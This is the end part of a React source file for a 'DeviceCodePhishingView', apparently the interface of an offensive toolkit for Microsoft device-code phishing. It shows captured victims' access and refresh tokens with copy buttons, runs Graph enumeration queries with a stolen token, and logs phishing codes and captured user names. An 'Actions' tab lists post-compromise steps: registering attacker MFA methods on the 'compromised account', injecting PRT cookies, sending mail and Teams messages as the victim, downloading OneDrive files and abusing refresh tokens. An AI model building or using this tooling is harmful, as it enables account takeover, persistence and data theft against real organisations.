                              </Text>
                            </Box>
                          </Flex>
                          <Flex gap={2}>
                            {!isActive && (
                              <Button size="xs" variant="ghost" borderRadius="6px" color={PURPLE}
                                bg={`${PURPLE}15`} border={`1px solid ${PURPLE}30`}
                                _hover={{ bg: `${PURPLE}25` }}
                                onClick={() => setActiveIdx(i)}
                              >
                                Set Active
                              </Button>
                            )}
                            {isActive && (
                              <Box px={2} py="2px" borderRadius="6px" bg={`${PURPLE}22`} border={`1px solid ${PURPLE}40`}>
                                <Text fontSize="10px" color={PURPLE} fontWeight="bold">ACTIVE</Text>
                              </Box>
                            )}
                            <Button size="xs" variant="ghost" color={RED} _hover={{ bg: `${RED}15` }}
                              onClick={() => removeToken(t.id)}>
                              <DeleteIcon boxSize={3} />
                            </Button>
                          </Flex>
                        </Flex>

                        {/* Decoded JWT Claims */}
                        {t.claims && (
                          <SimpleGrid columns={{ base: 1, md: 2, lg: 3 }} gap={3} mb={4}>
                            {[
                              { k: 'UPN',        v: t.claims.upn || t.claims.unique_name || t.claims.email || '—' },
                              { k: 'Tenant',     v: t.claims.tid || '—' },
                              { k: 'App',        v: t.claims.app_displayname || t.claims.azp || '—' },
                              { k: 'Roles',      v: (t.claims.roles || []).join(', ') || '—' },
                              { k: 'Scp',        v: (t.claims.scp || '').slice(0, 60) || '—' },
                              { k: 'MFA',        v: t.claims.amr ? t.claims.amr.join(', ') : '—' },
                            ].map(({ k, v }) => (
                              <Box key={k} bg="rgba(0,0,0,0.25)" borderRadius="8px" px={3} py={2}>
                                <Text fontSize="9px" color="var(--dash-text-muted)" textTransform="uppercase" letterSpacing="wider" mb={0.5}>{k}</Text>
                                <Text fontSize="11px" color="var(--dash-text-primary)" fontFamily="monospace" noOfLines={1}>{v}</Text>
                              </Box>
                            ))}
                          </SimpleGrid>
                        )}

                        {/* Token values */}
                        <Flex direction="column" gap={2}>
                          {[
                            { label: 'Access Token', val: t.access_token },
                            ...(t.refresh_token ? [{ label: 'Refresh Token', val: t.refresh_token }] : []),
                          ].map(({ label, val }) => (
                            <Box key={label} bg="rgba(0,0,0,0.3)" borderRadius="8px" p={3}>
                              <Flex justify="space-between" align="center" mb={1}>
                                <Text fontSize="10px" color="var(--dash-text-muted)" textTransform="uppercase" letterSpacing="wider">{label}</Text>
                                <CopyBtn text={val} />
                              </Flex>
                              <Text fontSize="10px" fontFamily="monospace" color={BLUE} noOfLines={2} wordBreak="break-all">{val}</Text>
                            </Box>
                          ))}
                        </Flex>
                      </Card>
                    </MotionBox>
                  );
                })}
              </Flex>
            )}
          </MotionBox>
        )}

        {/* ── Tab: Enumerate ─────────────────────────────────────────────── */}
        {tab === 'enumerate' && (
          <MotionBox key="enumerate" initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
            {!activeToken ? (
              <Card accentColor={GREEN}>
                <Flex align="center" justify="center" py={10}>
                  <Text color="var(--dash-text-muted)" fontSize="sm">No active token. Capture a token first.</Text>
                </Flex>
              </Card>
            ) : (
              <Flex direction="column" gap={5}>
                {/* Active token indicator */}
                <Flex align="center" gap={3} bg="rgba(104,211,145,0.08)" border={`1px solid ${GREEN}30`}
                  borderRadius="12px" px={4} py={3}>
                  <Box w="8px" h="8px" borderRadius="full" bg={GREEN} boxShadow={`0 0 6px ${GREEN}`} flexShrink={0} />
                  <Text fontSize="sm" color="var(--dash-text-primary)">
                    Active: <Text as="span" color={GREEN} fontWeight="semibold">{activeToken.label}</Text>
                  </Text>
                  <Button size="xs" variant="ghost" color="var(--dash-text-muted)" ml="auto"
                    _hover={{ color: PURPLE }} onClick={() => setTab('tokens')}>
                    Switch token
                  </Button>
                </Flex>

                {/* Category tabs */}
                <Flex gap={2} flexWrap="wrap">
                  {ENUM_CATALOG.map((cat) => (
                    <TabBtn key={cat.category} label={cat.category} active={enumCat === cat.category}
                      color={cat.color} onClick={() => setEnumCat(cat.category)} />
                  ))}
                </Flex>

                {/* Query list for active category */}
                {ENUM_CATALOG.filter((c) => c.category === enumCat).map((cat) => (
                  <SimpleGrid key={cat.category} columns={{ base: 1, md: 2 }} gap={3}>
                    {cat.queries.map((q) => (
                      <Card key={q.label} accentColor={cat.color}
                        cursor="pointer"
                        _hover={{ borderColor: `${cat.color}40`, bg: 'rgba(255,255,255,0.05)' }}
                        transition="all 0.15s"
                        onClick={() => runQuery(cat, q)}
                      >
                        <Flex justify="space-between" align="center">
                          <Box flex={1} minW={0}>
                            <Text fontSize="sm" fontWeight="semibold" color="var(--dash-text-primary)">{q.label}</Text>
                            <Text fontSize="10px" fontFamily="monospace" color="var(--dash-text-muted)" mt={0.5} noOfLines={1}>{q.endpoint}</Text>
                          </Box>
                          <Flex gap={2} ml={3} flexShrink={0}>
                            <CopyBtn text={q.endpoint} />
                            <Box px={2} py="3px" borderRadius="6px"
                              bg={`${cat.color}15`} border={`1px solid ${cat.color}30`}>
                              <Text fontSize="10px" color={cat.color} fontWeight="semibold">Run →</Text>
                            </Box>
                          </Flex>
                        </Flex>
                      </Card>
                    ))}
                  </SimpleGrid>
                ))}

                {/* Custom endpoint */}
                <Card accentColor={YELLOW}>
                  <Text fontSize="11px" fontWeight="bold" letterSpacing="widest" color={YELLOW} textTransform="uppercase" mb={3}>
                    Custom Endpoint
                  </Text>
                  <Flex gap={3}>
                    <Input {...inputSx} value={customEp} onChange={(e) => setCustomEp(e.target.value)}
                      placeholder="/v1.0/me" flex={1} />
                    <Button size="md" borderRadius="10px" px={5} variant="ghost"
                      color={YELLOW} bg={`${YELLOW}15`} border={`1px solid ${YELLOW}30`}
                      _hover={{ bg: `${YELLOW}25` }}
                      isLoading={customLoading}
                      onClick={runCustom}
                    >
                      Run
                    </Button>
                  </Flex>
                  {customResult && <Box mt={4}><JsonViewer data={customResult} /></Box>}
                </Card>
              </Flex>
            )}
          </MotionBox>
        )}

        {/* ── Tab: History ──────────────────────────────────────────────── */}
        {tab === 'history' && (
          <MotionBox key="history" initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
            <Flex justify="space-between" align="center" mb={4}>
              <Text fontSize="sm" color="var(--dash-text-muted)">{history.length} device codes generated</Text>
              <Button size="xs" variant="ghost" color={RED} _hover={{ bg: `${RED}15` }}
                onClick={() => { setHistory([]); localStorage.removeItem('dc_history'); }}>
                Clear History
              </Button>
            </Flex>
            {history.length === 0 ? (
              <Card accentColor={CYAN}>
                <Flex align="center" justify="center" py={10}>
                  <Text color="var(--dash-text-muted)" fontSize="sm">No history yet. Initiate a device code flow to start logging.</Text>
                </Flex>
              </Card>
            ) : (
              <Box overflowX="auto" borderRadius="14px" border="1px solid rgba(255,255,255,0.07)">
                <Box as="table" w="full" style={{ borderCollapse: 'collapse' }}>
                  <Box as="thead">
                    <Box as="tr" bg="rgba(0,0,0,0.4)">
                      {['#', 'Generated At', 'Expires At', 'Last Polled', 'User Code', 'Client', 'Tenant', 'Captured UPN', 'Status'].map((h) => (
                        <Box as="th" key={h} px={3} py={2.5} textAlign="left"
                          style={{ borderBottom: '1px solid rgba(255,255,255,0.08)', whiteSpace: 'nowrap' }}>
                          <Text fontSize="9px" fontWeight="bold" letterSpacing="wider" textTransform="uppercase" color={CYAN}>{h}</Text>
                        </Box>
                      ))}
                    </Box>
                  </Box>
                  <Box as="tbody">
                    {history.map((h, i) => {
                      const statusColor =
                        h.status === 'SUCCESS'  ? GREEN :
                        h.status === 'EXPIRED'  ? RED   :
                        h.status === 'DECLINED' ? RED   :
                        h.status === 'PENDING'  ? YELLOW : 'var(--dash-text-muted)';
                      return (
                        <Box as="tr" key={h.id}
                          bg={i % 2 === 0 ? 'rgba(255,255,255,0.01)' : 'transparent'}
                          _hover={{ bg: 'rgba(255,255,255,0.04)' }}
                          style={{ borderBottom: '1px solid rgba(255,255,255,0.04)' }}>
                          <Box as="td" px={3} py={2.5}>
                            <Text fontSize="11px" color="var(--dash-text-muted)">{history.length - i}</Text>
                          </Box>
                          <Box as="td" px={3} py={2.5} style={{ whiteSpace: 'nowrap' }}>
                            <Text fontSize="11px" color="var(--dash-text-primary)">{new Date(h.generated_at).toLocaleString()}</Text>
                          </Box>
                          <Box as="td" px={3} py={2.5} style={{ whiteSpace: 'nowrap' }}>
                            <Text fontSize="11px" color="var(--dash-text-muted)">{new Date(h.expires_at).toLocaleString()}</Text>
                          </Box>
                          <Box as="td" px={3} py={2.5} style={{ whiteSpace: 'nowrap' }}>
                            <Text fontSize="11px" color="var(--dash-text-muted)">{h.last_polled_at ? new Date(h.last_polled_at).toLocaleString() : '—'}</Text>
                          </Box>
                          <Box as="td" px={3} py={2.5}>
                            <Flex align="center" gap={1}>
                              <Text fontSize="12px" fontFamily="monospace" fontWeight="bold"
                                color="white" letterSpacing="2px">{h.user_code}</Text>
                              <CopyBtn text={h.user_code} />
                            </Flex>
                          </Box>
                          <Box as="td" px={3} py={2.5} style={{ whiteSpace: 'nowrap' }}>
                            <Text fontSize="11px" color="var(--dash-text-secondary)">{h.client_label}</Text>
                          </Box>
                          <Box as="td" px={3} py={2.5}>
                            <Text fontSize="11px" fontFamily="monospace" color="var(--dash-text-muted)">{h.tenant_id}</Text>
                          </Box>
                          <Box as="td" px={3} py={2.5}>
                            <Text fontSize="11px" color={h.captured_upn ? GREEN : 'var(--dash-text-muted)'}>
                              {h.captured_upn || '—'}
                            </Text>
                          </Box>
                          <Box as="td" px={3} py={2.5}>
                            <Box display="inline-flex" px={2} py="2px" borderRadius="5px"
                              bg={`${statusColor}20`} border={`1px solid ${statusColor}40`}>
                              <Text fontSize="10px" color={statusColor} fontWeight="bold">{h.status}</Text>
                            </Box>
                          </Box>
                        </Box>
                      );
                    })}
                  </Box>
                </Box>
              </Box>
            )}
          </MotionBox>
        )}

        {/* ── Tab: Actions & Reference ──────────────────────────────────── */}
        {tab === 'actions' && (
          <MotionBox key="actions" initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
            <SimpleGrid columns={{ base: 1, lg: 2 }} gap={4} alignItems="start">

              {[
                {
                  title: 'Register MFA Method (Authenticator)',
                  color: RED,
                  desc: 'Add a new Microsoft Authenticator app as an MFA method for the compromised account.',
                  steps: [
                    'POST /v1.0/me/authentication/microsoftAuthenticatorMethods',
                    'Body: {} (triggers device registration flow)',
                    'Follow the registration URL returned in the response',
                  ],
                },
                {
                  title: 'Register TOTP / FIDO Key',
                  color: ORANGE,
                  desc: 'Add a software TOTP or hardware FIDO2 key as an additional MFA method.',
                  steps: [
                    'POST /v1.0/me/authentication/softwareOathMethods',
                    'or POST /v1.0/me/authentication/fido2Methods',
                    'Use GraphSpy for full interactive flow',
                  ],
                },
                {
                  title: 'Generate PRT Cookie',
                  color: PURPLE,
                  desc: 'Use a Primary Refresh Token to generate a PRT cookie for browser-based Entra SSO.',
                  steps: [
                    'Requires a PRT from a domain-joined device',
                    'Use AADInternals: Get-AADIntUserPRTToken',
                    'Inject cookie into browser via DevTools → Application → Cookies',
                  ],
                },
                {
                  title: 'Send Email via Graph',
                  color: BLUE,
                  desc: 'Send an email from the compromised mailbox using the Microsoft Graph API.',
                  steps: [
                    'POST /v1.0/me/sendMail',
                    'Body: { message: { subject, body, toRecipients } }',
                    'Requires Mail.Send scope',
                  ],
                },
                {
                  title: 'Download OneDrive File',
                  color: GREEN,
                  desc: 'Access and download files from the compromised user\'s OneDrive.',
                  steps: [
                    'GET /v1.0/me/drive/root/children — list root',
                    'GET /v1.0/me/drive/items/{item-id}/content — download',
                    'Requires Files.Read scope',
                  ],
                },
                {
                  title: 'Exfil via Teams Message',
                  color: '#5865F2',
                  desc: 'Send messages in Teams channels or DMs from the compromised account.',
                  steps: [
                    'GET /v1.0/me/joinedTeams — list teams',
                    'GET /v1.0/teams/{team-id}/channels — list channels',
                    'POST /v1.0/teams/{team-id}/channels/{channel-id}/messages',
                  ],
                },
                {
                  title: 'Azure Management API',
                  color: CYAN,
                  desc: 'Use the Azure Management REST API to enumerate subscriptions, VMs, and resources.',
                  steps: [
                    'Scope: https://management.azure.com/.default',
                    'GET https://management.azure.com/subscriptions?api-version=2020-01-01',
                    'GET https://management.azure.com/subscriptions/{sub}/resources?api-version=2021-04-01',
                  ],
                },
                {
                  title: 'Refresh Token Abuse',
                  color: YELLOW,
                  desc: 'Use a captured refresh token to obtain new access tokens for different scopes.',
                  steps: [
                    'Use the Token Vault → paste refresh token',
                    'Backend: POST /api/device-code/refresh',
                    'Body: { tenantId, clientId, refreshToken, scope }',
                  ],
                },
              ].map((item) => (
                <MotionBox key={item.title} initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }}>
                  <Card accentColor={item.color}>
                    <Text fontSize="sm" fontWeight="semibold" color="var(--dash-text-primary)" mb={1}>{item.title}</Text>
                    <Text fontSize="xs" color="var(--dash-text-secondary)" mb={3}>{item.desc}</Text>
                    <Flex direction="column" gap={1}>
                      {item.steps.map((s, i) => (
                        <Flex key={i} align="flex-start" gap={2}>
                          <Text fontSize="10px" color={item.color} fontFamily="monospace" mt="1px">{i + 1}.</Text>
                          <Flex flex={1} align="center" justify="space-between" gap={2}>
                            <Text fontSize="11px" fontFamily="monospace" color="var(--dash-text-muted)">{s}</Text>
                            <CopyBtn text={s} />
                          </Flex>
                        </Flex>
                      ))}
                    </Flex>
                  </Card>
                </MotionBox>
              ))}
            </SimpleGrid>
          </MotionBox>
        )}

      </AnimatePresence>
    </Box>
  );
};

export default DeviceCodePhishingView;
